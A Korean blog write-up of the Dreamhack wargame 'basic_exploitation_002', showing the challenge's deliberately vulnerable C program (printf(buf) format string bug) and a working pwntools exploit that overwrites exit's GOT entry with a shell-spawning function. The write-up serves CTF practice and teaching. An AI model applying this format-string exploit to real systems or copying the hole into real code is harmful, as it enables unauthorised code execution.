---
title: "[Dreamhack] basic_exploitation_002 Write up"
author: d0razi
date: 2023-08-22 10:45
categories: [InfoSec, Pwn]
tags: [linux, Dreamhack]
image: /assets/img/media/banner/dreamhack.jpg
---

## C 코드

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void get_shell() {
    system("/bin/sh");
}

int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();

    read(0, buf, 0x80);
    printf(buf);

    exit(0);
}
```

일단 main함수의 read부분에서 0x80만큼 받게 지정해둬서 오버플로우는 발생시키지 못 할꺼같다.

하지만 그 밑에 printf부분에서 FSB취약점이 발생하는걸 볼 수 있다. exit()의 got주소를 get_shell의 주소로 바꿔주면 될꺼같다.

---

## 파일 분석

우리가 디버깅을 하면서 알아내야 하는 정보를 정리해보자

- 입력한 값을 받는 오프셋
- exit함수의 got주소
- get_shell의 주소

디버깅은 peda를 사용했습니다.

$ exit의 got주소와 get_shell의 주소는 pwntools를 사용해서 구하겠다. $

그럼 이제 알아야하는건 오프셋만 남았다.

실행시키고 aaaa.%p.%p.%p.%p.%p.%p.%p 를 입력해서 확인해보자

```bash
❯ ./basic_exploitation_002 
aaaa.%p.%p.%p.%p.%p.%p.%p
aaaa.0x61616161.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0xf7f80a70
```

이제 모든 정보를 얻었으니 익스플로잇 코드를 짜보자.

---

## Exploit

```python
from pwn import *

p = process("./basic_exploitation_002")

e = ELF('./basic_exploitation_002')

shell_addr=e.symbols['get_shell']
exit_got=e.got['exit']

payload=fmtstr_payload(1,{exit_got:shell_addr})

p.sendline(payload)
p.interactive()
```

이번 코드를 짤때는 pwntools의 fmtstr_payload 함수를 사용해보았다. 이 함수는 FSB의 페이로드를 짜주  는 함수이다. 구조를 간단하게 설명해보면 

fmtstr_payload(”오프셋”,{”덮힐주소”: “덮을주소”})

이런식으로 사용하면 된다.

한번 실행시켜보자.

![Screenshot from 2022-10-18 15-08-00.png](/assets/img/media/post_img/dreamhack/basic_ex_002/Screenshot_from_2022-10-18_15-08-00.png)

쉘이 따진 모습!